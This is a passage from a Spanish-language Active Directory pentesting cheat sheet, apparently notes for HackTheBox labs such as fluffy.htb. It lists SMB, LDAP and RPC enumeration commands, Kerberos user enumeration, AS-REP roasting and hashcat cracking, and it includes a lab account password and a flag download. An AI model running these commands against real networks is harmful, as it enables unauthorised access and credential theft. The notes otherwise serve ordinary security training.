<span class="line"><span style="color:#F8F8F2">  </span></span>
<span class="line"><span style="color:#6272A4"># smbclient </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#BD93F9"> -L</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -U</span><span style="color:#F1FA8C"> usuario</span><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#BD93F9"> -L</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -U</span><span style="color:#F1FA8C"> guest%</span><span style="color:#F8F8F2"> </span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># smbmap </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbmap</span><span style="color:#BD93F9"> -H</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> password</span></span>
<span class="line"></span></code></pre>
<h3 id="-acceder-a-un-recurso">üìÇ Acceder a un recurso</h3>
<h2 id="smbclient">smbclient</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Acceder sin credenciales (sesi√≥n nula) </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">SHAR</span><span style="color:#F8F8F2">E</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -N</span><span style="color:#F8F8F2">  </span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Acceder con usuario/contrase√±a </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">SHAR</span><span style="color:#F8F8F2">E</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -U</span><span style="color:#F1FA8C"> usuario</span><span style="color:#F8F8F2">  </span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Acceder con dominio </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">SHAR</span><span style="color:#F8F8F2">E</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -U</span><span style="color:#F1FA8C"> DOMINIO/usuario%password</span></span></code></pre>
<h3 id="-descargar-archivos">üíæ Descargar archivos</h3>
<ul>
<li>Comandos para descargar contenido (Distintos tipos de usuarios tendran distintos tipos de privilegios)</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">smb:</span><span style="color:#FF79C6"> \></span><span style="color:#F1FA8C"> ls</span><span style="color:#6272A4">                       # lista archivos en el share</span></span>
<span class="line"><span style="color:#50FA7B">smb:</span><span style="color:#FF79C6"> \></span><span style="color:#F1FA8C"> lcd</span><span style="color:#F1FA8C"> /home/user/descargas</span><span style="color:#6272A4"> # carpeta local donde guardar archivos</span></span>
<span class="line"><span style="color:#50FA7B">smb:</span><span style="color:#FF79C6"> \></span><span style="color:#F1FA8C"> mask</span><span style="color:#E9F284"> ""</span><span style="color:#6272A4">                   # opcional: filtro de archivos</span></span>
<span class="line"><span style="color:#50FA7B">smb:</span><span style="color:#FF79C6"> \></span><span style="color:#F1FA8C"> prompt</span><span style="color:#F1FA8C"> OFF</span></span>
<span class="line"><span style="color:#50FA7B">smb:</span><span style="color:#FF79C6"> \></span><span style="color:#F1FA8C"> recurse</span><span style="color:#F1FA8C"> ON</span></span>
<span class="line"><span style="color:#50FA7B">smb:</span><span style="color:#FF79C6"> \></span><span style="color:#F1FA8C"> mget</span><span style="color:#BD93F9;font-style:italic"> *</span></span>
<span class="line"><span style="color:#50FA7B">smb:</span><span style="color:#FF79C6"> \></span><span style="color:#F1FA8C"> get</span><span style="color:#F1FA8C"> archivo.txt</span><span style="color:#6272A4">           # descargar archivo espec√≠fico</span></span>
<span class="line"><span style="color:#50FA7B">smb:</span><span style="color:#FF79C6"> \></span><span style="color:#F1FA8C"> exit</span><span style="color:#6272A4">                      # salir del prompt</span></span>
<span class="line"></span></code></pre>
<hr>
<h2 id="2Ô∏è‚É£-smbmap">2Ô∏è‚É£ smbmap</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Acceder y listar contenido del share (recursivo) </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbmap</span><span style="color:#BD93F9"> -H</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> password</span><span style="color:#BD93F9"> -r</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">SHAR</span><span style="color:#F8F8F2">E</span><span style="color:#FF79C6">></span><span style="color:#F8F8F2">  </span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Descargar archivo espec√≠fico </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbmap</span><span style="color:#BD93F9"> -H</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> password</span><span style="color:#BD93F9"> --download</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">C$/Users/Administrador/Desktop/flag.txt</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<hr>
<h2 id="3Ô∏è‚É£-crackmapexec--netexec">3Ô∏è‚É£ CrackMapExec / NetExec</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Enumerar y probar acceso al share </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">crackmapexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> password</span><span style="color:#BD93F9"> --shares</span><span style="color:#F8F8F2">  </span></span>
<span class="line"></span>
<span class="line"></span></code></pre>
<hr>
<h2 id="4Ô∏è‚É£-mountcifs-linux">4Ô∏è‚É£ mount.cifs (Linux)</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4"># Montar un recurso SMB en /mnt/smb </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> mount</span><span style="color:#BD93F9"> -t</span><span style="color:#F1FA8C"> cifs</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">SHAR</span><span style="color:#F8F8F2">E</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> /mnt/smb</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> username=usuario,password=pass</span><span style="color:#F8F8F2">  </span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Montar en modo an√≥nimo </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> mount</span><span style="color:#BD93F9"> -t</span><span style="color:#F1FA8C"> cifs</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">SHAR</span><span style="color:#F8F8F2">E</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> /mnt/smb</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> guest</span></span>
<span class="line"></span></code></pre>
<hr>
<h3 id="-acceso-a-carpetas-de-sistema-sysvol--netlogon">üìå Acceso a carpetas de sistema (SYSVOL / NETLOGON)</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_HOS</span><span style="color:#F8F8F2">T</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/SYSVOL</span><span style="color:#BD93F9"> -U</span><span style="color:#F1FA8C"> usuario</span><span style="color:#F8F8F2"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_HOS</span><span style="color:#F8F8F2">T</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/NETLOGON</span><span style="color:#BD93F9"> -U</span><span style="color:#F1FA8C"> usuario</span></span>
<span class="line"></span></code></pre>
<p>6Ô∏è‚É£ Notas y evidencia</p>
<ul>
<li>
<p>Shares accesibles:</p>
</li>
<li>
<p>Usuarios extra√≠dos:</p>
</li>
<li>
<p>Archivos importantes encontrados:</p>
</li>
</ul>
<hr>
<h2 id="-enumeraci√≥n-ldap">üîé Enumeraci√≥n LDAP</h2>
<ul>
<li>
<p>Enumerar <strong>todos los usuarios del dominio</strong> <code>fluffy.htb</code>.</p>
</li>
<li>
<p>Obtener su <strong>nombre completo</strong> (<code>cn</code>) y su <strong>nombre de inicio de sesi√≥n</strong> (<code>sAMAccountName</code>).</p>
</li>
<li>
<p>Sirve para <strong>pentesting / auditor√≠a</strong>, porque te da un <strong>mapa de cuentas existentes en AD</strong>, que luego puede usarse en pruebas de fuerza bruta o Kerberos.</p>
</li>
<li>
<p>NXC</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">nxc</span><span style="color:#F1FA8C"> ldap</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> USERNAME</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> PASS</span><span style="color:#BD93F9"> --users</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">nxc</span><span style="color:#F1FA8C"> ldap</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> USERNAME</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> PASS</span><span style="color:#BD93F9"> --query</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">(sAMAccountName=ca_svc)</span><span style="color:#E9F284">"</span><span style="color:#E9F284"> ""</span><span style="color:#F8F8F2">   </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">nxc</span><span style="color:#F1FA8C"> ldap</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> USERNAME</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> PASS</span><span style="color:#BD93F9"> --bloodhound</span><span style="color:#BD93F9"> --collection</span><span style="color:#F1FA8C"> All</span><span style="color:#BD93F9"> --dns-server</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">nxc</span><span style="color:#F1FA8C"> ldap</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> USERNAME</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> PASS</span><span style="color:#BD93F9"> -M</span><span style="color:#F1FA8C"> groupmembership</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> USER=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">USERNAME</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># LDAP sin autenticaci√≥n:</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">ldapsearch</span><span style="color:#BD93F9"> -x</span><span style="color:#BD93F9"> -H</span><span style="color:#F1FA8C"> ldap://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -b</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">dc=dominio,dc=local</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># LDAP con credenciales:</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">ldapsearch</span><span style="color:#BD93F9"> -x</span><span style="color:#BD93F9"> -H</span><span style="color:#F1FA8C"> ldap://10.10.11.69</span><span style="color:#BD93F9"> -D</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">j.fleischman@fluffy.htb</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -w</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">J0elTHEM4n1990!</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -b</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">dc=fluffy,dc=htb</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"></span></code></pre>
<ul>
<li>LDAP an√≥nimo (base y namingContext)</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">ldapsearch</span><span style="color:#BD93F9"> -x</span><span style="color:#BD93F9"> -H</span><span style="color:#F1FA8C"> ldap://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> base</span><span style="color:#BD93F9"> -b</span><span style="color:#E9F284"> ""</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">(objectClass=*)</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">ldapsearch</span><span style="color:#BD93F9"> -x</span><span style="color:#BD93F9"> -H</span><span style="color:#F1FA8C"> ldap://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -b</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">DC=&#x3C;dominio>,DC=&#x3C;tld></span><span style="color:#E9F284">"</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">(objectClass=user)</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C"> cn</span><span style="color:#F1FA8C"> sAMAccountName</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">ldapsearch</span><span style="color:#BD93F9"> -x</span><span style="color:#BD93F9"> -H</span><span style="color:#F1FA8C"> ldap://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -b</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">dc=dom,dc=local</span><span style="color:#E9F284">"</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">(objectClass=user)</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C"> sAMAccountName</span></span>
<span class="line"></span></code></pre>
<ul>
<li>LDAP con credenciales</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">ldapsearch</span><span style="color:#BD93F9"> -x</span><span style="color:#BD93F9"> -H</span><span style="color:#F1FA8C"> ldap://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -D</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">&#x3C;usuario>@&#x3C;dominio></span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -w</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">&#x3C;contrase√±a></span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> base</span><span style="color:#BD93F9"> -b</span><span style="color:#E9F284"> ""</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">(objectClass=*)</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">ldapsearch</span><span style="color:#BD93F9"> -x</span><span style="color:#BD93F9"> -H</span><span style="color:#F1FA8C"> ldap://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -D</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">&#x3C;usuario>@&#x3C;dominio></span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -w</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">&#x3C;contrase√±a></span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -b</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">DC=&#x3C;dominio>,DC=&#x3C;tld></span><span style="color:#E9F284">"</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">(objectClass=user)</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C"> cn</span><span style="color:#F1FA8C"> sAMAccountName</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">ldapsearch</span><span style="color:#BD93F9"> -x</span><span style="color:#BD93F9"> -H</span><span style="color:#F1FA8C"> ldap://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -D</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">&#x3C;usuario>@&#x3C;dominio></span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -w</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">&#x3C;contrase√±a></span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -b</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">dc=dom,dc=local</span><span style="color:#E9F284">"</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">(objectClass=user)</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C"> sAMAccountName</span></span>
<span class="line"></span>
<span class="line"></span></code></pre>
<ul>
<li>Listado v√≠a Windapsearch / ldeep (si disponible)</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">python3</span><span style="color:#F1FA8C"> windapsearch.py</span><span style="color:#BD93F9"> -d</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> ''</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> ''</span><span style="color:#BD93F9"> --dc-ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --attributes</span><span style="color:#F1FA8C"> sAMAccountName,memberOf</span></span>
<span class="line"></span></code></pre>
<ul>
<li>DNS AD (si expuesto)</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">adidnsdump</span><span style="color:#BD93F9"> -d</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -s</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span></code></pre>
<p><strong>Notas/Evidencia:</strong></p>
<ul>
<li>Base DN: ‚Ä¶</li>
<li>Usuarios/Grupos: ‚Ä¶</li>
</ul>
<hr>
<h2 id="-enumeraci√≥n-rpc">üîé Enumeraci√≥n RPC</h2>
<p>Comandos RPC</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Conectarse a un recurso compartido en sesi√≥n nula </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">rpcclient</span><span style="color:#BD93F9"> -U</span><span style="color:#E9F284"> ""</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F8F8F2">  </span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Con usuario</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">rpcclient</span><span style="color:#BD93F9"> -U</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">usuario%password</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span></code></pre>
<p>Algunos comandos √∫tiles:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">-</span><span style="color:#F1FA8C"> `</span><span style="color:#50FA7B">enumdomusers</span><span style="color:#F1FA8C">`</span><span style="color:#50FA7B"> Enumerar</span><span style="color:#F1FA8C"> usuarios</span><span style="color:#F1FA8C"> del</span><span style="color:#F1FA8C"> dominio.</span></span>
<span class="line"><span style="color:#F8F8F2">    </span></span>
<span class="line"><span style="color:#50FA7B">-</span><span style="color:#F1FA8C"> `</span><span style="color:#50FA7B">enumdomgroups</span><span style="color:#F1FA8C">`</span><span style="color:#50FA7B"> Enumerar</span><span style="color:#F1FA8C"> grupos</span><span style="color:#F1FA8C"> del</span><span style="color:#F1FA8C"> dominio.</span></span>
<span class="line"><span style="color:#F8F8F2">    </span></span>
<span class="line"><span style="color:#50FA7B">-</span><span style="color:#F1FA8C"> `</span><span style="color:#50FA7B">queryuser</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">RID</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">`</span><span style="color:#50FA7B"> Mostrar</span><span style="color:#F1FA8C"> detalles</span><span style="color:#F1FA8C"> de</span><span style="color:#F1FA8C"> un</span><span style="color:#F1FA8C"> usuario</span><span style="color:#F1FA8C"> espec√≠fico.</span></span>
<span class="line"><span style="color:#F8F8F2">    </span></span>
<span class="line"><span style="color:#50FA7B">-</span><span style="color:#F1FA8C"> `</span><span style="color:#50FA7B">querydispinfo</span><span style="color:#F1FA8C">`</span><span style="color:#50FA7B"> Listar</span><span style="color:#F1FA8C"> usuarios</span><span style="color:#F1FA8C"> con</span><span style="color:#F1FA8C"> informaci√≥n</span><span style="color:#F1FA8C"> detallada</span><span style="color:#F8F8F2"> (como </span><span style="color:#F1FA8C">nombres</span><span style="color:#F1FA8C"> completos</span><span style="color:#F1FA8C"> y</span><span style="color:#F1FA8C"> comentarios</span><span style="color:#F8F8F2">).</span></span>
<span class="line"><span style="color:#F8F8F2">    </span></span>
<span class="line"><span style="color:#50FA7B">-</span><span style="color:#F1FA8C"> `</span><span style="color:#50FA7B">netshareenum</span><span style="color:#F1FA8C">`</span><span style="color:#50FA7B"> Enumerar</span><span style="color:#F1FA8C"> recursos</span><span style="color:#F1FA8C"> compartidos.</span></span>
<span class="line"><span style="color:#F8F8F2">    </span></span>
<span class="line"><span style="color:#50FA7B">-</span><span style="color:#F1FA8C"> `</span><span style="color:#50FA7B">srvinfo</span><span style="color:#F1FA8C">`</span><span style="color:#50FA7B"> Ver</span><span style="color:#F1FA8C"> informaci√≥n</span><span style="color:#F1FA8C"> general</span><span style="color:#F1FA8C"> de</span><span style="color:#F1FA8C"> la</span><span style="color:#F1FA8C"> m√°quina.</span></span>
<span class="line"><span style="color:#F8F8F2">  </span></span></code></pre>
<hr>
<h2 id="-enumeraci√≥n-kerberos">üîé Enumeraci√≥n KERBEROS</h2>
<ul>
<li>Descubrir usuarios v√°lidos</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">kerbrute</span><span style="color:#F1FA8C"> userenum</span><span style="color:#BD93F9"> -d</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --dc</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> users.txt</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> kerbrute_users.txt</span></span>
<span class="line"></span></code></pre>
<ul>
<li>AS-REP Roasting (usuarios sin preauth)</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">impacket-GetNPUsers</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#BD93F9"> -dc-ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -no-pass</span><span style="color:#BD93F9"> -usersfile</span><span style="color:#F1FA8C"> kerbrute_users.txt</span><span style="color:#BD93F9"> -outputfile</span><span style="color:#F1FA8C"> asrep_hashes.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">impacket-GetNPUsers</span><span style="color:#F1FA8C"> DOM.LOCAL/</span><span style="color:#BD93F9"> -dc-ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -usersfile</span><span style="color:#F1FA8C"> users.txt</span><span style="color:#BD93F9"> -outputfile</span><span style="color:#F1FA8C"> hashes.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Hashcat: modo 18200 (Kerberos 5 AS-REP)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">hashcat</span><span style="color:#BD93F9"> -m</span><span style="color:#BD93F9"> 18200</span><span style="color:#F1FA8C"> asrep_hashes.txt</span><span style="color:#F1FA8C"> rockyou.txt</span></span>
<span class="line"></span></code></pre>
<ul>
